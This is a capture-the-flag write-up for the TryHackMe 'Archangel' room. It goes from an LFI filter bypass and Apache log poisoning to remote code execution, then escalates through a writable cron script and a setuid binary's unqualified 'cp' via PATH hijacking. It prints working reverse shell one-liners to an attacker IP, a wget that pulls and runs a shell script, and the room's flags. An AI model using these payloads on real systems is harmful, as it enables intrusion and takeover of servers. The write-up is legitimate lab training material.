# Tryhackme.com Room : Archangel
`https://tryhackme.com/room/archangel`

## Instance

```bash
export IP=10.10.154.82
```

## Nmap

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Foothold

We browse the webserver and find a website for a security company `WaveFire`
All Lorem ipsum
We gobuster the webserver 
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php -u h
ttp://$IP`

```
/index.html (Status: 200)
/images (Status: 301)
/pages (Status: 301)
/flags (Status: 301)
/layout (Status: 301)
/licence.txt (Status: 200)
```

Looking at `/flags` we find an html file that redirect us to youtube. Let's download the file with `wget http://$IP/flags/flag.html` but it's really just a redirect 

```html
<meta http-equiv="Refresh" content="0; url='https://www.youtube.com/watch?v=dQw4w9WgXcQ'" />
```

From the `/licence.txt` file on the server, we see that `WaveFire` is the name of the website template.  `Mafialive Solutions` might be the name of the company ?

So yeah, looking more closely at the website, we can clearly see `support@mafialive.thm`
let's try to use this as a hostname to access the website.

When we access `mafialive.thm` we get

```
UNDER DEVELOPMENT
thm{f0und_th3_r1ght_h0st_n4m3} 
```

Now we enumerate again with gobuster

There is a `/robots.txt` file with

```
User-agent: *
Disallow: /test.php
```

Which is a page containing a button with a local file inclusion !

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```



We can play with the `view` query parameter to browse files on the server
Seems like there is some kind of protection. If we simply browse `mafialive.thm/test.php?view=/etc/passwd` we get `Sorry, Thats not allowed ` 

We can read the code of `test.php` using `php filters` 

````
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php 
````

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>
```

We find a flag

```
thm{explo1t1ng_lf1}
```

We see that the `view` parameter must contains

```
/var/www/html/development_testing
```

And not

```
../..
```

We can simply use 

```
.././../.
```

We can retrieve `/etc/passwd` with 

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```



We see that we have a user `archangel` 
Doesn't seem to have an ssh key. I can retrieve the user flag with

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././home/archangel/user.txt
```

```
thm{lf1_t0_rc3_1s_tr1cky}
```

But then how do we get a shell ? hmm

Looking at `crontab` with

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././etc/crontab
```

```
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Let's take a look at `/opt/helloworld.sh` 

```bash
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```

Hmmm, not much help. We would somehow need to change this script file ?
It is runned as `archangel` user. it's probably the way to pivot to the user and not the initial foothold.

Let's look at log files ! Maybe we can inject some php inside our useragent and get a shell
We can access the log file with

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log
```

Let's use the following user agent :

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.32.20/8888 0>&1'"); ?>
```

Hmm something went wrong here... Can't see the access 

Soo, after a while of playing around with this, I got it right. To inject the command parameter :

```bash
curl -H 'User-Agent: <?php echo passthru($_GET[pwn]); ?>' mafialive.thm/pwn
```

We create a reverse shell script

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.6.32.20/8888 0>&1
```

We upload the script with

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log&pwn=wget%2010.6.32.20:8000/revshell.sh -O /dev/shm/revshell.sh
```

We then execute with 

```
mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log&pwn=bash /dev/shm/revshell.sh
```

And we finally got a shell !

## www-data user

Again (for completness) we find the user flag in `/home/archangel/user.txt`

```
thm{lf1_t0_rc3_1s_tr1cky}
```

Now, previously we found that a cronjob running `/opt/helloworld.sh` is runned as `archangel` user

The file is editable, we can create another revshell i guess

```
bash -i >& /dev/tcp/10.6.32.20/7777 0>&1
```

We wait a bit and we get a shell as archangel

```
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
```



## Archangel User / Getting root

We find a second user flag in `/home/archangel/secret/user2.txt` 

```
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```

We see a `setuid ` executable `/home/archangel/secret/backup`

```
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
```

Maybe we can use the ld_library injection trick

Running `strings ./backup` we find the command executed as root via the `system` GLIBC fuction

```bash
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

So actually, it's easier than the LD_PRELOAD, we can abuse the `*` 

Hmmmmm, well, the path is wrong.. it refer to `/home/USER/archangel` not `/home/archangel` 
I kinda thought that there was an error in the binary, but it was actually just a rabbit hole..

I looked up a write up and it was pretty obvious. The command executed is `cp`, without full path.
We can highjack `cp` and get root.
To do so we just 

```bash
>> export PATH=/home/archangel/bin:$PATH
```

And then we create an executable script `/home/archangel/bin/cp` :

```bash
#!/bin/bash
id
echo Pwn
```

When running `~/secret/backup` we get 

```
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
```

So this is runned as root. Let's get another revshell goin

```
bash -i >& /dev/tcp/10.6.32.20/6666 0>&1
```

And we got root !

The flag in `/root/root.txt` :

```
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```



## End